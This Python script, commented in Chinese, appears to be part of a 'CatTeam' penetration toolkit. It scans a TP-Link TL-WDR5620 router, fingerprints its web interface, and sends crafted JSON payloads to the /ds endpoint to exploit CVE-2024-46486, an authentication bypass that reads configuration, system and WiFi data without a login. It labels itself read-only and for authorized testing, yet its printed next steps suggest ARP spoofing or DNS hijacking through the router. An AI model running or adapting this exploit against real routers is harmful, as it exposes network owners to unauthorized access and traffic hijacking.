#!/usr/bin/env python3
"""
CatTeam 模块: TP-Link 路由器漏洞验证工具
=========================================
目标: TL-WDR5620 千兆易展版
CVE:  CVE-2024-46486 (httpProcDataSrv 未授权 RCE, CVSS 8.0)
      CVE-2018-20372 (weather 命令注入, 需登录)

原理:
  httpProcDataSrv 接收 HTTP POST 的 JSON 数据。
  当 JSON 中包含 "cfgsync" 和 "method":"do" 时，
  请求会绕过 httpDoAuthorize 鉴权检查，
  允许未授权执行系统级操作 (工厂重置、配置读取等)。

用法:
  python3 20-tplink-probe.py <target_ip>
  python3 20-tplink-probe.py 10.130.1.252

⚠️ 仅供授权安全测试使用！
"""

import sys
import json
import time
import socket
import urllib.request
import urllib.error
import ssl

# ========== 色彩 ==========
G = "\033[1;32m"
R = "\033[0;31m"
Y = "\033[1;33m"
C = "\033[0;36m"
P = "\033[1;35m"
W = "\033[1;37m"
DIM = "\033[2m"
NC = "\033[0m"

SSL_CTX = ssl.create_default_context()
SSL_CTX.check_hostname = False
SSL_CTX.verify_mode = ssl.CERT_NONE

TIMEOUT = 5


def banner():
    print(f"""
{P}╔══════════════════════════════════════════════════════════╗
║  {W}🐱 CatTeam TP-Link 路由器漏洞验证工具{P}                  ║
║  {C}目标: TL-WDR5620 千兆易展版{P}                            ║
║  {C}CVE:  CVE-2024-46486 (httpProcDataSrv 未授权){P}          ║
║  {Y}⚠️  仅供授权安全测试{P}                                    ║
╚══════════════════════════════════════════════════════════╝{NC}
""")


def http_get(url:str) -> dict:
    """发送 GET 请求，返回 status, headers, body"""
    try:
        req = urllib.request.Request(url, headers={"User-Agent": "CatTeam/5.0"})
        ctx = SSL_CTX if url.startswith("https") else None
        with urllib.request.urlopen(req, timeout=TIMEOUT, context=ctx) as resp:
            body = resp.read().decode("utf-8", errors="replace")
            return {"status": resp.status, "headers": dict(resp.headers), "body": body, "error": None}
    except urllib.error.HTTPError as e:
        body = e.read().decode("utf-8", errors="replace") if e.fp else ""
        return {"status": e.code, "headers": dict(e.headers), "body": body, "error": None}
    except Exception as e:
        return {"status": None, "headers": {}, "body": "", "error": str(e)}


def http_post_json(url: str, data: str) -> dict:
    """发送 POST 请求 (原始 JSON 字符串)"""
    try:
        req = urllib.request.Request(
            url,
            data=data.encode("utf-8"),
            headers={
                "User-Agent": "CatTeam/5.0",
                "Content-Type": "application/json",
            },
            method="POST"
        )
        with urllib.request.urlopen(req, timeout=TIMEOUT) as resp:
            body = resp.read().decode("utf-8", errors="replace")
            return {"status": resp.status, "body": body, "error": None}
    except urllib.error.HTTPError as e:
        body = e.read().decode("utf-8", errors="replace") if e.fp else ""
        return {"status": e.code, "body": body, "error": None}
    except Exception as e:
        return {"status": None, "body": "", "error": str(e)}


def check_port(ip: str, port: int) -> bool:
    """检查端口是否开放"""
    try:
        with socket.create_connection((ip, port), timeout=3):
            return True
    except:
        return False


# ========== Phase 1: 侦察 ==========
def phase1_recon(ip: str):
    """Web 管理页面侦察"""
    print(f"\n  {Y}{'='*55}")
    print(f"  Phase 1: Web 管理页面侦察")
    print(f"  {'='*55}{NC}\n")

    # 先检测端口
    ports = [80, 443, 8080]
    open_ports = []
    for port in ports:
        status = check_port(ip, port)
        tag = f"{G}OPEN{NC}" if status else f"{DIM}CLOSED{NC}"
        print(f"  [{tag}] {ip}:{port}")
        if status:
            open_ports.append(port)

    if not open_ports:
        print(f"\n  {R}[!] 目标无 Web 端口开放，终止侦察。{NC}")
        return False

    # HTTP 指纹探测
    print(f"\n  {C}[~] HTTP 指纹探测...{NC}")
    url = f"http://{ip}:{open_ports[0]}"
    result = http_get(url)

    if result["error"]:
        print(f"  {R}[!] 连接失败: {result['error']}{NC}")
        return False

    print(f"  {G}[+] HTTP Status: {result['status']}{NC}")

    server = result["headers"].get("Server", "N/A")
    print(f"  {G}[+] Server: {server}{NC}")

    # 检查页面标题
    body = result["body"]
    import re
    title_match = re.search(r"<title>(.*?)</title>", body, re.IGNORECASE)
    title = title_match.group(1) if title_match else "(无 Title)"
    print(f"  {G}[+] Title: {title}{NC}")

    # 检查是否为 TP-Link
    is_tplink = any(kw in body.lower() for kw in ["tp-link", "tplink", "tl-wdr", "wdr5620"])
    if is_tplink:
        print(f"\n  {G}[+] ✅ 确认目标为 TP-Link 路由器！{NC}")
    else:
        print(f"\n  {Y}[?] 未在页面中检测到 TP-Link 特征标识{NC}")
        print(f"  {DIM}    (可能使用了自定义固件或非标准页面){NC}")

    # 尝试探测 /ds 接口 (CVE-2024-46486 的入口点)
    print(f"\n  {C}[~] 探测 CVE-2024-46486 入口点 (/ds)...{NC}")
    ds_result = http_get(f"http://{ip}/ds")
    if ds_result["status"] is not None:
        print(f"  {G}[+] /ds 接口响应: HTTP {ds_result['status']}{NC}")
        print(f"  {G}[+] 入口点存在！可能存在 httpProcDataSrv 漏洞。{NC}")
    else:
        print(f"  {Y}[?] /ds 接口无响应: {ds_result['error']}{NC}")

    # 探测其他常见 TP-Link 路径
    print(f"\n  {C}[~] 探测 TP-Link 常见路径...{NC}")
    common_paths = [
        "/userRpm/LoginRpm.htm",
        "/webpages/login.html",
        "/cgi-bin/luci",
        "/login.htm",
    ]
    for path in common_paths:
        r = http_get(f"http://{ip}{path}")
        if r["status"] and r["status"] < 400:
            print(f"  {G}[+] {path} -> HTTP {r['status']}{NC}")
        else:
            print(f"  {DIM}[·] {path} -> {'HTTP ' + str(r['status']) if r['status'] else 'N/A'}{NC}")

    return True


# ========== Phase 2: CVE-2024-46486 验证 ==========
def phase2_cve_verify(ip: str):
    """CVE-2024-46486 漏洞存在性验证 (只读操作，不破坏)"""
    print(f"\n  {Y}{'='*55}")
    print(f"  Phase 2: CVE-2024-46486 漏洞验证 (只读安全模式)")
    print(f"  {'='*55}{NC}\n")

    print(f"  {C}[~] 漏洞原理:{NC}")
    print(f"  {DIM}    httpProcDataSrv 接收 JSON POST 请求时,")
    print(f"    若 JSON 含 'cfgsync' + 'method':'do',")
    print(f"    会绕过 httpDoAuthorize 鉴权 → 未授权执行{NC}\n")

    # 安全的只读 Payload: 只读取配置，不修改任何内容
    # 使用 "get" method 获取系统状态，不触发任何写入操作
    payloads = [
        {
            "name": "配置信息探测 (cfgsync bypass)",
            "data": '{"method":"get","cfgsync":{"get_config_info":null}}',
            "desc": "尝试通过 cfgsync 旁路读取配置同步信息",
        },
        {
            "name": "系统状态探测 (method:get)",
            "data": '{"method":"get","system":{"sysinfo":null}}',
            "desc": "尝试未授权读取系统信息",
        },
        {
            "name": "无线状态探测",
            "data": '{"method":"get","wireless":{"wlan_host_2g":{"table":"*"}},"cfgsync":{"get_config_info":null}}',
            "desc": "尝试通过 cfgsync 旁路读取 WiFi 配置",
        },
    ]

    vuln_confirmed = False

    for i, p in enumerate(payloads, 1):
        print(f"  {W}[{i}/{len(payloads)}] {p['name']}{NC}")
        print(f"  {DIM}    {p['desc']}{NC}")
        print(f"  {DIM}    Payload: {p['data'][:80]}...{NC}")

        result = http_post_json(f"http://{ip}/ds", p["data"])

        if result["error"]:
            print(f"  {R}    ✘ 请求失败: {result['error']}{NC}\n")
            continue

        print(f"  {C}    HTTP {result['status']}{NC}")

        # 分析响应
        body = result["body"]
        if body:
            # 尝试解析 JSON 响应
            try:
                resp_json = json.loads(body)
                print(f"  {G}    ✅ 收到 JSON 响应！{NC}")

                # 检查是否包含实际配置数据
                error_code = resp_json.get("error_code", -1)
                if error_code == 0:
                    print(f"  {R}    🔥 漏洞确认！未授权访问成功 (error_code: 0){NC}")
                    vuln_confirmed = True

                    # 安全地打印部分响应内容
                    resp_str = json.dumps(resp_json, indent=2, ensure_ascii=False)
                    # 截断过长的输出
                    if len(resp_str) > 500:
                        print(f"  {G}    响应数据 (截断):{NC}")
                        for line in resp_str[:500].split("\n"):
                            print(f"  {DIM}      {line}{NC}")
                        print(f"  {DIM}      ... (共 {len(resp_str)} 字符){NC}")
                    else:
                        for line in resp_str.split("\n"):
                            print(f"  {DIM}      {line}{NC}")
                else:
                    print(f"  {Y}    返回 error_code: {error_code}{NC}")

            except json.JSONDecodeError:
                print(f"  {Y}    非 JSON 响应: {body[:100]}{NC}")
        else:
            print(f"  {DIM}    (空响应体){NC}")

        print()
        time.sleep(0.5)  # 避免过于频繁

    # 总结
    print(f"  {Y}{'='*55}")
    print(f"  验证结果总结")
    print(f"  {'='*55}{NC}\n")

    if vuln_confirmed:
        print(f"  {R}  ██████████████████████████████████████████{NC}")
        print(f"  {R}  ██ 🔥 CVE-2024-46486 漏洞已确认存在！ ██{NC}")
        print(f"  {R}  ██████████████████████████████████████████{NC}")
        print(f"""
  {Y}[!] 风险等级: {R}HIGH (CVSS 8.0){NC}
  {Y}[!] 漏洞类型: {W}未授权远程代码执行 (Unauthenticated RCE){NC}
  {Y}[!] 影响范围: {W}完全控制路由器，劫持子网流量{NC}

  {C}[~] 建议后续操作:{NC}
  {G}    1. 在 AI 副官 (13) 中分析此漏洞的横向利用价值{NC}
  {G}    2. 尝试通过此路由器进行 ARP 欺骗或 DNS 劫持{NC}
  {G}    3. 检查路由器固件版本，确认是否已修补{NC}
  {G}    4. 将发现记录到渗透测试报告中{NC}
""")
    else:
        print(f"  {G}[+] 当前 Payload 未能触发漏洞响应。{NC}")
        print(f"  {C}    可能原因:{NC}")
        print(f"  {DIM}    - 固件已更新至修补版本{NC}")
        print(f"  {DIM}    - 管理接口有额外的访问控制{NC}")
        print(f"  {DIM}    - 需要调整 Payload 格式{NC}")

    return vuln_confirmed


def main():
    banner()

    if len(sys.argv) < 2:
        print(f"  {Y}用法: python3 {sys.argv[0]} <target_ip>{NC}")
        print(f"  {DIM}  例: python3 {sys.argv[0]} 10.130.1.252{NC}\n")
        sys.exit(1)

    ip = sys.argv[1]
    print(f"  {W}[*] 目标: {G}{ip}{NC}")
    print(f"  {W}[*] 模式: {C}只读安全验证 (不修改目标配置){NC}")

    # Phase 1: 侦察
    if not phase1_recon(ip):
        sys.exit(1)

    # 确认继续
    print(f"\n  {Y}[?] 是否继续执行 CVE-2024-46486 漏洞验证? (Y/n): {NC}", end="")
    confirm = input().strip()
    if confirm.lower() == "n":
        print(f"  {DIM}[*] 已取消。{NC}\n")
        sys.exit(0)

    # Phase 2: 漏洞验证
    phase2_cve_verify(ip)

    print(f"\n  {DIM}CatTeam TP-Link 路由器漏洞验证完毕 🐱{NC}\n")


if __name__ == "__main__":
    main()
